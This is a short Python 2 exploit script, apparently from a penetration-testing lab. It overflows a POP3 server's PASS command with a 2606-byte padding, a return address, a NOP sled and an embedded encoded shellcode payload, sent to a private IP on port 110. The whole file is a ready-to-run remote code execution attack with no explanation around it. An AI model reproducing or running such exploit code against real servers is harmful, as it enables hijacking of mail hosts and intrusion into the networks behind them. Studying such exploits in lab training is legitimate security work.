#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xda\xcc\xb8\x85\x1f\x48\x98\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x13\x03\xc6\x0c\xaa\x6d\x34\xda\xa8"
"\x8e\xc4\x1b\xcd\x07\x21\x2a\xcd\x7c\x22\x1d\xfd\xf7\x66\x92"
"\x76\x55\x92\x21\xfa\x72\x95\x82\xb1\xa4\x98\x13\xe9\x95\xbb"
"\x97\xf0\xc9\x1b\xa9\x3a\x1c\x5a\xee\x27\xed\x0e\xa7\x2c\x40"
"\xbe\xcc\x79\x59\x35\x9e\x6c\xd9\xaa\x57\x8e\xc8\x7d\xe3\xc9"
"\xca\x7c\x20\x62\x43\x66\x25\x4f\x1d\x1d\x9d\x3b\x9c\xf7\xef"
"\xc4\x33\x36\xc0\x36\x4d\x7f\xe7\xa8\x38\x89\x1b\x54\x3b\x4e"
"\x61\x82\xce\x54\xc1\x41\x68\xb0\xf3\x86\xef\x33\xff\x63\x7b"
"\x1b\x1c\x75\xa8\x10\x18\xfe\x4f\xf6\xa8\x44\x74\xd2\xf1\x1f"
"\x15\x43\x5c\xf1\x2a\x93\x3f\xae\x8e\xd8\xd2\xbb\xa2\x83\xba"
"\x08\x8f\x3b\x3b\x07\x98\x48\x09\x88\x32\xc6\x21\x41\x9d\x11"
"\x45\x78\x59\x8d\xb8\x83\x9a\x84\x7e\xd7\xca\xbe\x57\x58\x81"
"\x3e\x57\x8d\x06\x6e\xf7\x7e\xe7\xde\xb7\x2e\x8f\x34\x38\x10"
"\xaf\x37\x92\x39\x5a\xc2\x75\x4c\x90\xcc\x22\x38\xa4\xcc\x2d"
"\x02\x21\x2a\x47\x64\x64\xe5\xf0\x1d\x2d\x7d\x60\xe1\xfb\xf8"
"\xa2\x69\x08\xfd\x6d\x9a\x65\xed\x1a\x6a\x30\x4f\x8c\x75\xee"
"\xe7\x52\xe7\x75\xf7\x1d\x14\x22\xa0\x4a\xea\x3b\x24\x67\x55"
"\x92\x5a\x7a\x03\xdd\xde\xa1\xf0\xe0\xdf\x24\x4c\xc7\xcf\xf0"
"\x4d\x43\xbb\xac\x1b\x1d\x15\x0b\xf2\xef\xcf\xc5\xa9\xb9\x87"
"\x90\x81\x79\xd1\x9c\xcf\x0f\x3d\x2c\xa6\x49\x42\x81\x2e\x5e"
"\x3b\xff\xce\xa1\x96\xbb\xff\xeb\xba\xea\x97\xb5\x2f\xaf\xf5"
"\x45\x9a\xec\x03\xc6\x2e\x8d\xf7\xd6\x5b\x88\xbc\x50\xb0\xe0"
"\xad\x34\xb6\x57\xcd\x1c")

buffer = "A"*2606+"\x8f\x35\x4a\x5f"+ "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)


try:
	print "\nSending evil buffer..."
	s.connect(('10.11.23.12',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"